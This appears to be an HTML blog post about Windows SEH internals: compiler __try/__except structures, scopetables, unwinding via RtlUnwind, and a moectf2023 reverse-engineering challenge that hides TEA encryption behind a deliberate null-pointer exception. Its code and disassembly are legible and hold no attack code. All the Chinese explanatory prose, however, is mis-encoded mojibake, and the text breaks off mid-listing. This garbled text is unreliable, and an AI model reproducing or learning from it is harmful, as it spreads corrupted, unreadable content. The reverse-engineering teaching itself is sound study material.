ä¸€ä¸ªC++ç±»çš„å®ä¾‹ä½œä¸ºå±€éƒ¨å˜é‡çš„å‡½æ•°ã€‚C++è§„èŒƒè§„å®šææ„å‡½æ•°å¿…é¡»è¢«è°ƒç”¨ã€‚è¿™å¸¦EH_UNWINDINGæ ‡å¿—çš„ç¬¬äºŒæ¬¡å›è°ƒå°±ç»™è¿™ä¸ªå‡½æ•°ä¸€ä¸ªæœºä¼šå»åšä¸€äº›ç±»ä¼¼äºè°ƒç”¨ææ„å‡½æ•°å’Œ__finallyå—ä¹‹ç±»çš„æ¸…ç†å·¥ä½œã€‚</p><p>â€‹ç²—æš´åœ°æ¥è¯´ï¼Œå±•å¼€å°±æ˜¯äºŒæ¬¡æ‰§è¡Œå¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œå¹¶åšä¸€äº›æ¸…ç†ã€‚</p><h2 id="ç¼–è¯‘å™¨å±‚é¢çš„SEH"><a href="#ç¼–è¯‘å™¨å±‚é¢çš„SEH" class="headerlink" title="ç¼–è¯‘å™¨å±‚é¢çš„SEH"></a>ç¼–è¯‘å™¨å±‚é¢çš„SEH</h2><p>â€‹è™½ç„¶ä½¿ç”¨å‡ å¥ç®€å•çš„æ±‡ç¼–ä¹Ÿå¯ä»¥å®‰è£…SEHç»“æ„ï¼Œä½†æ˜¯åœ¨ä½¿ç”¨ä¸Šå¤šå°‘è¿˜æ˜¯æœ‰ä¸ä¾¿ï¼Œäºæ˜¯ä¹Visualä¸ºæ­¤è¿›è¡Œäº†è®¾ç½®è¯­æ³•ç»“æ„ï¼Œå³ç®€å•çš„<code>__try&#123;&#125; __except&#123;&#125;</code>ç»“æ„ï¼Œå®ƒçš„æ¨¡å¼æ˜¯è¿™æ ·çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">__try &#123;<br>    <span class="hljs-comment">// è¿™é‡Œæ˜¯è¢«ä¿æŠ¤çš„ä»£ç </span><br>&#125;<br>__except (è¿‡æ»¤å™¨è¡¨è¾¾å¼) &#123; <br>   <span class="hljs-comment">// è¿™é‡Œæ˜¯å¼‚å¸¸å¤„ç†ç¨‹åºä»£ç </span><br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹åœ¨æ±‡ç¼–å±‚é¢å®é™…ä¸Šä¸ä¹‹å‰çš„æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå°±æ˜¯åœ¨è¿›å…¥ä¸€ä¸ª<code>__try</code>å—ä¹‹å‰ä¸€å®šä¼šçœ‹åˆ°ç±»ä¼¼çš„è¯­å¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">MOV DWORD PTR FS:[<span class="hljs-number">00000000</span>],ESP<br></code></pre></td></tr></table></figure><p>â€‹ä¹Ÿå°±æ˜¯å®‰è£…SEHåˆ°<code>fs:[0]</code>å¤„ï¼Œä¸ä¹‹å‰çš„çŸ¥è¯†æ˜¯ä¸€è‡´çš„</p><p>â€‹ä½†å®é™…ä¸Šï¼ŒVisualçš„<code>__try</code>ç»“æ„æ˜¯æ‰©å±•äº†çš„ï¼Œå®ƒå¾€é‡Œé¢<code>_EXCEPTION_REGISTRATION_RECORD</code>ç»“æ„æ·»äº†ç‚¹æ–°ä¸œè¥¿ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span>&#123;</span><br>   <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION</span> *<span class="hljs-title">prev</span>;</span><br>   <span class="hljs-type">void</span> (*handler)(    PEXCEPTION_RECORD,<br>                   PEXCEPTION_REGISTRATION,<br>                   PCONTEXT,<br>                  PEXCEPTION_RECORD);<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">scopetable_entry</span> *<span class="hljs-title">scopetable</span>;</span><br> <span class="hljs-type">int</span> trylevel;<br>&#125;;<br></code></pre></td></tr></table></figure><p>â€‹æ­¤ç»“æ„çš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒæˆå‘˜ä¸ä¹‹å‰çš„æ˜¯ä¸€æ ·çš„ï¼Œåé¢ä¸‰ä¸ªåŸŸï¼šscopetableï¼ˆä½œç”¨åŸŸè¡¨ï¼‰ã€trylevelå’Œ_ebpæ˜¯æ–°å¢åŠ çš„ã€‚scopetableåŸŸæŒ‡å‘ä¸€ä¸ªscopetable_entryç»“æ„æ•°ç»„ï¼Œè€ŒtrylevelåŸŸå®é™…ä¸Šæ˜¯è¿™ä¸ªæ•°ç»„çš„ç´¢å¼•ã€‚æœ€åä¸€ä¸ªåŸŸ_ebpï¼Œæ˜¯EXCEPTION_REGISTRATIONç»“æ„åˆ›å»ºä¹‹å‰æ ˆå¸§æŒ‡é’ˆï¼ˆEBPï¼‰çš„å€¼ã€‚</p><p>â€‹è¿˜æœ‰ä¸€ä¸ªç»“æ„ä¸æ­¤ç›¸å…³ï¼Œä¹Ÿæ˜¯VisualçœŸæ­£ä½¿ç”¨çš„ç»“æ„<code>CPPEH_RECORD</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CPPEH_RECORD</span>&#123;</span><br>    DWORD old_esp;<br>    EXCEPTION_POINTERS *exc_ptr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_REGISTRATION_RECORD</span> <span class="hljs-title">registration</span>;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹æ­¤å¤„çš„<code>old_esp</code>æ˜¯çœŸæ­£å¼€å§‹æ‰§è¡Œæ­£å¸¸å‡½æ•°æ“ä½œæ—¶çš„esp</p><p>â€‹åŒæ—¶ä¿ç•™ä¸€ä¸ªDWORDæ¥å­˜å‚¨<code>EXCEPTION_POINTERS</code>ç»“æ„ï¼Œè¿™ä¸ªç»“æ„å…¶å®å°±æ˜¯è°ƒç”¨<strong>GetExceptionInformation</strong>æ‰€è¿”å›çš„æŒ‡é’ˆï¼Œå¦‚ä¸‹æ˜¯æ­¤ç»“æ„çš„å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EXCEPTION_POINTERS</span> &#123;</span><br>  PEXCEPTION_RECORD ExceptionRecord;<br>  PCONTEXT          ContextRecord;<br>&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;<br></code></pre></td></tr></table></figure><p>â€‹è¯´äº†è¿™ä¹ˆå¤šä¸å¦‚ç›´æ¥æ¥çœ‹çœ‹Visualæ˜¯æ€ä¹ˆåšçš„å§ï¼</p><p>â€‹ä¸‹é¢ç»™å‡ºæºç å’Œè¿›å…¥<code>__try</code>ä¹‹å‰çš„åæ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    __try<br>    &#123;<br>    <br>    &#125;<br>    __except (EXCEPTION_EXECUTE_HANDLER)<br>    &#123;<br>       <br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">push        ebp  <br>mov         ebp,esp  <br>push        <span class="hljs-number">0F</span>FFFFFFEh  <span class="hljs-comment">//å‹å…¥TryLevel</span><br>push        <span class="hljs-number">539228</span>h  <span class="hljs-comment">//å‹å…¥ScopTable</span><br>push        offset _except_handler4 (<span class="hljs-number">0533</span>DB0h)  <span class="hljs-comment">//å‹å…¥_except_handler4</span><br>mov         eax,dword ptr fs:[<span class="hljs-number">00000000</span>h]  <br>push        eax  <span class="hljs-comment">//å‹å…¥NextæŒ‡é’ˆ</span><br>    <br>    <span class="hljs-comment">//å¼€è¾Ÿæ–°ç©ºé—´ åšä¸€äº›å®‰å…¨æ£€æŸ¥</span><br>add         esp,<span class="hljs-number">0F</span>FFFFF38h  <br>push        ebx  <br>push        esi  <br>push        edi  <br>lea         edi,[ebp<span class="hljs-number">-18</span>h]  <br>xor         ecx,ecx  <br>mov         eax,<span class="hljs-number">0</span>CCCCCCCCh  <br>rep stos    dword ptr es:[edi]  <br>mov         eax,dword ptr [__security_cookie (<span class="hljs-number">053</span>A004h)]  <br>xor         dword ptr [ebp<span class="hljs-number">-8</span>],eax  <br>xor         eax,ebp  <br>push        eax  <br>    <span class="hljs-comment">//å®‰å…¨æ£€æŸ¥ç»“æŸ</span><br>    <br>lea         eax,[ebp<span class="hljs-number">-10</span>h]  <br>mov         dword ptr fs:[<span class="hljs-number">00000000</span>h],eax  <span class="hljs-comment">//æŠŠä¸Šä¸€ä¸ªSEHåœ°å€ç»™ç°åœ¨è¿™ä¸ªSEHç»“æ„</span><br>mov         dword ptr [ebp<span class="hljs-number">-18</span>h],esp  <span class="hljs-comment">//ä¿å­˜ç°åœ¨çš„ESPå€¼</span><br>    <br>    <span class="hljs-comment">//ä¸€äº›å®‰å…¨æ£€æŸ¥</span><br>mov         ecx,offset _EF1F479B_SEH@cpp (<span class="hljs-number">053</span>C0A2h)  <br>call        @__CheckForDebuggerJustMyCode@<span class="hljs-number">4</span> (<span class="hljs-number">053132F</span>h)  <br></code></pre></td></tr></table></figure><p>â€‹è¿™é‡Œç»™å‡ºæ ˆçš„åˆ†å¸ƒå›¾ï¼Œå°±ä¼šæ›´åŠ æ˜æœ—äº†</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202308221821893.jpg"></p><p>â€‹ç°åœ¨å®‰è£…SEHåçš„æ ˆåˆ†å¸ƒå›¾çŸ¥é“äº†ï¼Œå°±å¯ä»¥å…·ä½“ç ”ç©¶é‚£äº›æ–°å¢æˆå‘˜çš„å«ä¹‰äº†ã€‚</p><p>â€‹å¦‚ä¸‹æ˜¯<code>_SCOPETABLE_ENTRY</code>ç»“æ„å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SCOPETABLE_ENTRY</span>&#123;</span><br>    DWORD EnclosingLevel; <span class="hljs-comment">//ä¸Šä¸€å±‚__tryå—</span><br>    PVOID FilterFunc; <span class="hljs-comment">//è¿‡æ»¤è¡¨è¾¾å¼</span><br>    PVOID HandlerFunc; <span class="hljs-comment">//__exceptä»£ç æˆ–__finallyä»£ç </span><br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹è¿™é‡Œçš„<code>FilterFunc</code>å°±æ˜¯<code>except</code>é‡Œé¢çš„è¿‡æ»¤è¡¨è¾¾å¼ï¼Œå®ƒåœ¨è¿™é‡Œå……å½“å¼‚å¸¸ç­›é€‰çš„ä½œç”¨ï¼Œå¯ä»¥å®Œæˆä»»ä½•æƒ³è¦å®Œæˆçš„å·¥ä½œï¼Œåªè¦æœ€ååå›çš„ç»“æœç¬¦å·è¦æ±‚å³å¯ï¼Œå…¶è¿”å›å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXCEPTION_EXECUTE_HANDLER 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXCEPTION_CONTINUE_SEARCH 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXCEPTION_CONTINUE_EXECUTION -1</span><br></code></pre></td></tr></table></figure><p>â€‹<code>HandlerFunc</code>å°±æ˜¯ä¹‹å‰çš„å¼‚å¸¸å¤„ç†å‡½æ•°äº†ã€‚</p><p>â€‹é‚£ä¹ˆç¼–è¯‘å™¨ä¸ºä»€ä¹ˆè¦é€‰æ‹©å¯¹ç»“æ„è¿›è¡Œæ‰©å±•å‘¢ï¼Ÿå…¶åŸå› æ˜¯ç¼–è¯‘å™¨**å¹¶ä¸ä¼šå¯¹æ¯ä¸ª<code>__try</code>å—éƒ½ç”Ÿæˆä¸€ä¸ª<code>EXCEPTION_REGISTRATION_RECORD</code>ç»“æ„ï¼Œè€Œæ˜¯ä¸ç®¡æœ‰å¤šå±‚åµŒå¥—è°ƒç”¨çš„<code>__try</code>å—éƒ½åªç”Ÿæˆä¸€ä¸ª<code>EXCEPTION_REGISTRATION_RECORD</code>ç»“æ„å¹¶æŒ‚å…¥çº¿ç¨‹çš„å¼‚å¸¸é“¾è¡¨ã€‚å¯¹äºé‚£äº›ä¸åŒ<code>__except</code>å—ä»£ç åˆ™ç”¨ä¸€ä¸ªä»£ç†å‡½æ•°å¤„ç†ï¼Œè¿™ä¸ªä»£ç†å‡½æ•°å°±æ˜¯æ‰©å±•ç»“æ„<code>_EXCEPTION_REGISTRATION_RECORD</code>çš„<code>_except_handler4</code>å‡½æ•°ï¼Œè€Œæˆ‘ä»¬è‡ªå·±å†™çš„<code>__except</code>ä»£ç åˆ™è¢«å­˜å‚¨åœ¨<code>scopetable</code>æ•°ç»„ä¸­ã€‚</p><p>â€‹æ¢å¥è¯è¯´ï¼Œç¼–è¯‘å™¨å°†å¤šå±‚çš„<code>__try</code>å—è¿›è¡ŒæŠ½è±¡ï¼Œä½¿ç”¨<code>_except_handler4</code>æ¥å¤„ç†æ‰€æœ‰çš„<code>__except</code>ä»£ç ï¼Œåœ¨<code>scopetable</code>æ•°ç»„ä¸­å­˜å‚¨äº†ç›¸åº”å±‚çº§çš„<code>FilterFunc</code>ã€<code>HandlerFunc</code>ï¼Œè€Œæ‰©å±•ç»“æ„ä¸­çš„<code>TryLevel</code>å°±æ˜¯è¿™ä¸ªæ•°ç»„çš„ç´¢å¼•ï¼Œ<code>_except_handler4</code>å°±å¯ä»¥é€šè¿‡è¿™äº›ç»“æ„æ¥è°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚</p><p>â€‹</p><h2 id="å†è°ˆå±•å¼€"><a href="#å†è°ˆå±•å¼€" class="headerlink" title="å†è°ˆå±•å¼€"></a>å†è°ˆå±•å¼€</h2><p>â€‹å‰é¢æåŠå±•å¼€å°±æ˜¯ç»™å‡½æ•°ç¬¬äºŒæ¬¡æœºä¼šï¼Œè®©ä»–æ¸…ç†ä¸€ä¸‹è‡ªå·±çš„ä¸œè¥¿ï¼Œå¹¶ä¸”æŠŠSEHçš„é“¾è¡¨å¤´è®¾ç½®ä¸ºå½“å‰çš„SEHã€‚è¿™ä¸€éƒ¨åˆ†æ˜¯æ“ä½œç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ï¼Œå½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰‹åŠ¨è¿›è¡Œå±•å¼€æ“ä½œï¼Œå¾®è½¯æä¾›ä¸€ä¸ªAPI<code>RtlUnwind</code>å¯ä»¥å®Œæˆè¿™ä¸ªæ“ä½œï¼Œè¿™ä¸ªå‡½æ•°å£°æ˜å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">RtlUnwind(VirtualTargetFrame,TargetPC,ExceptionRecord,ReturnValue)<br></code></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><blockquote><p>VirtualTargetFrameï¼šå±•å¼€æ—¶æœ€åSEHåœæ­¢ä¸å›è°ƒå‡½æ•°å¯¹åº”çš„EXCEPTION_REGISTRATION_RECORDæŒ‡é’ˆï¼Œå³å¸Œæœ›åœ¨å“ªä¸ªå›è°ƒå‡½æ•°å‰å±•å¼€è°ƒç”¨åœæ­¢</p><p>TargetPCï¼šè°ƒç”¨RtlUnwindè¿”å›ååº”æ‰§è¡ŒæŒ‡ä»¤çš„åœ°å€ï¼Œå¦‚æœ0ï¼Œåˆ™è‡ªç„¶è¿”å›RtlUnwindè°ƒç”¨åä¸‹ä¸€æ¡æŒ‡ä»¤</p><p>ExceptionRecordï¼šå½“å‰å¼‚å¸¸EXCEPTION_RECORDç»“æ„</p><p>ReturnValueï¼šè¿”å›å€¼ï¼Œé€šå¸¸ä¸ä½¿ç”¨</p></blockquote><p>â€‹å®é™…ä¸Šå¤§å¤šæ—¶å€™å¹¶ä¸éœ€è¦è‡ªå·±æ‰‹åŠ¨è°ƒç”¨ï¼Œå¾®è½¯ä¹Ÿå¹¶æ²¡æœ‰ååˆ†å…¬å¼€æ­¤APIï¼Œç”±æ“ä½œç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨å³å¯ã€‚</p><h1 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h1><p>ä»¥ä»Šå¹´moectfä¸ºä¾‹æ¥è§£è¯´ä¸€ä¸‹å§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main_0</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [esp+0h] [ebp-100h]</span><br><br>  __CheckForDebuggerJustMyCode(&amp;unk_5EC063);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to moectf2023!!! Now you find YunZh1Jun&#x27;s revenge!!!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Do you know TEA(an encryption algorithm)? Do you know unwind in SEH? &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I believe you can understand them! So let me check your flag~&quot;</span>);<br>  sub_5E10CD(<span class="hljs-string">&quot;Input:&quot;</span>, v4);<br>  sub_5E13CA(<span class="hljs-string">&quot;%64s&quot;</span>, (<span class="hljs-type">char</span>)&amp;flag);<br>  MEMORY[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  sub_5E10FF();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Right flag! Have fun in moectf2023~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹è¿™æ˜¯ä¸»å‡½æ•°çš„åæ±‡ç¼–ï¼Œå¦‚æœä½¿ç”¨IDAæ‰“å¼€ä¼šå‘ç°å¤§çº¢å¤§çº¢çš„<code>MEMORY[0] = 0</code>ï¼Œå®é™…ä¸Šå°±æ˜¯æ•…æ„å¼•å‘é”™è¯¯æ¥ä½¿ç”¨SEHï¼ŒIDAå¹¶ä¸ä¼šæŠŠ<code>__except</code>å†…å®¹ç»™åæ±‡ç¼–å‡ºæ¥ï¼Œæ‰€ä»¥å¿…é¡»çœ‹æ±‡ç¼–ä»£ç ï¼Œå¦‚ä¸‹æ˜¯ç›¸å…³çš„æ±‡ç¼–ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">005E5908</span> ;   __try &#123; <span class="hljs-comment">// __except at loc_5E5928</span><br>.text:<span class="hljs-number">005E5908</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E590</span>F mov     large dword ptr ds:<span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E590</span>F ;   &#125; <span class="hljs-comment">// starts at 5E5908</span><br>.text:<span class="hljs-number">005E5919</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">0F</span>FFFFFFEh<br>.text:<span class="hljs-number">005E5920</span> jmp     <span class="hljs-type">short</span> loc_5E597A<br>    <br>.text:<span class="hljs-number">005E5928</span> loc_5E5928:<br>.text:<span class="hljs-number">005E5928</span> ;   __except(loc_5E5922) <span class="hljs-comment">// owned by 5E5908</span><br>.text:<span class="hljs-number">005E5928</span> mov     esp, [ebp+ms_exc.old_esp]<br>.text:<span class="hljs-number">005E592</span>B push    offset aDx3906  ; <span class="hljs-string">&quot;DX3906&quot;</span><br>.text:<span class="hljs-number">005E5930</span> push    offset flag<br>.text:<span class="hljs-number">005E5935</span> call    enc<br>.text:<span class="hljs-number">005E593</span>A add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E593</span>D push    offset aDoctor3 ; <span class="hljs-string">&quot;doctor3&quot;</span><br>.text:<span class="hljs-number">005E5942</span> push    offset dword_5EA580<br>.text:<span class="hljs-number">005E5947</span> call    enc<br>.text:<span class="hljs-number">005E594</span>C add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E594</span>F push    offset aFux1aoyun ; <span class="hljs-string">&quot;FUX1AOYUN&quot;</span><br>.text:<span class="hljs-number">005E5954</span> push    offset unk_5EA588<br>.text:<span class="hljs-number">005E5959</span> call    enc<br>.text:<span class="hljs-number">005E595</span>E add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E5961</span> push    offset aR3verier ; <span class="hljs-string">&quot;R3verier&quot;</span><br>.text:<span class="hljs-number">005E5966</span> push    offset dword_5EA590<br>.text:<span class="hljs-number">005E596</span>B call    enc<br>.text:<span class="hljs-number">005E5970</span> add     esp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">005E5973</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">0F</span>FFFFFFEh<br></code></pre></td></tr></table></figure><p>â€‹å…¶ä¸­<code>//</code>æ‰€æ³¨é‡Šçš„è¯­å¥éƒ½æ˜¯IDAè‡ªåŠ¨è¯†åˆ«æ·»åŠ çš„ï¼Œå¯ä»¥é€šè¿‡è¿™å‡ ä¸ªæ³¨é‡Šè¯­å¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°<code>__try&#123;&#125; __except&#123;&#125;</code>ç»“æ„ï¼Œè€Œ<code>__except</code>æ‹¬å·ä¸­çš„ä»£ç å°±åº”è¯¥æ˜¯å¼‚å¸¸ç­›é€‰å‡½æ•°äº†ï¼Œè¿™é¢˜æ²¡æœ‰ä½¿ç”¨å¼‚å¸¸ç­›é€‰å‡½æ•°ï¼Œå‡æ˜¯ç›´æ¥å¤„ç†å¼‚å¸¸ã€‚</p><p>â€‹æ‰€ä»¥<code>loc_5E5928</code>å¤„ä»£ç å°±æ˜¯ç›¸å…³çš„å¼‚å¸¸å¤„ç†å‡½æ•°äº†ï¼Œæ­¤å¼‚å¸¸çš„ä¸»è¦ä»£ç å°±åœ¨è¿™é‡Œé¢ï¼Œæ‰€ä½¿ç”¨çš„åŠ å¯†ç®—æ³•å°±æ˜¯æ™®é€šçš„TEAï¼Œè¿™ä¸æ˜¯æœ¬æ–‡ä¸»è¦åˆ†æå†…å®¹ä¸”ç›¸å…³åŠ è§£å¯†ä¹Ÿå¾ˆç®€å•å°±ä¸å†èµ˜è¿°ã€‚</p><p>â€‹ç»§ç»­å¾€ä¸‹çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">loc_5E597A:<br>.text:<span class="hljs-number">005E597</span>A ;   __try &#123; <span class="hljs-comment">// __except at loc_5E5995</span><br>.text:<span class="hljs-number">005E597</span>A mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">1</span><br>.text:<span class="hljs-number">005E5981</span> call    sub_5E10FF<br>.text:<span class="hljs-number">005E5981</span> ;   &#125; <span class="hljs-comment">// starts at 5E597A</span><br>.text:<span class="hljs-number">005E5986</span> mov     [ebp+ms_exc.registration.TryLevel], <span class="hljs-number">0F</span>FFFFFFEh<br>.text:<span class="hljs-number">005E598</span>D jmp     <span class="hljs-type">short</span> loc_5E5A01<br>    <br>loc_5E5995:<br>.text:<span class="hljs-number">005E5995</span> ;   __except(loc_5E598F) <span class="hljs-comment">// owned by 5E597A</span><br>.text:<span class="hljs-number">005E5995</span> mov     esp, [ebp+ms_exc.old_esp]<br>.text:<span class="hljs-number">005E5998</span> mov     [ebp+var_20], <span class="hljs-number">0</span><br>.text:<span class="hljs-number">005E599</span>F jmp     <span class="hljs-type">short</span> loc_5E59AA<br></code></pre></td></tr></table></figure><p>â€‹æ˜¾ç„¶æ­¤æ—¶çš„å…³é”®å‡½æ•°æ˜¯<code>__try</code>å—é‡Œçš„<code>sub_5E10FF</code>ï¼Œè·Ÿè¿›å»æŸ¥çœ‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">005E1820</span> var_E4= dword ptr <span class="hljs-number">-0E4</span>h<br>.text:<span class="hljs-number">005E1820</span> var_10= byte ptr <span class="hljs-number">-10</span>h<br>.text:<span class="hljs-number">005E1820</span> var_C= dword ptr <span class="hljs-number">-0</span>Ch<br>.text:<span class="hljs-number">005E1820</span> var_4= dword ptr <span class="hljs-number">-4</span><br>.text:<span class="hljs-number">005E1820</span><br>.text:<span class="hljs-number">005E1820</span> push    ebp<br>.text:<span class="hljs-number">005E1821</span> mov     ebp, esp<br>.text:<span class="hljs-number">005E1823</span> sub     esp, <span class="hljs-number">0</span>D0h<br>.text:<span class="hljs-number">005E1829</span> push    ebx<br>.text:<span class="hljs-number">005E182</span>A push    esi<br>.text:<span class="hljs-number">005E182</span>B push    edi<br>.text:<span class="hljs-number">005E182</span>C lea     edi, [ebp+var_10]<br>.text:<span class="hljs-number">005E182</span>F mov     ecx, <span class="hljs-number">4</span><br>.text:<span class="hljs-number">005E1834</span> mov     eax, <span class="hljs-number">0</span>CCCCCCCCh<br>.text:<span class="hljs-number">005E1839</span> rep stosd<br>.text:<span 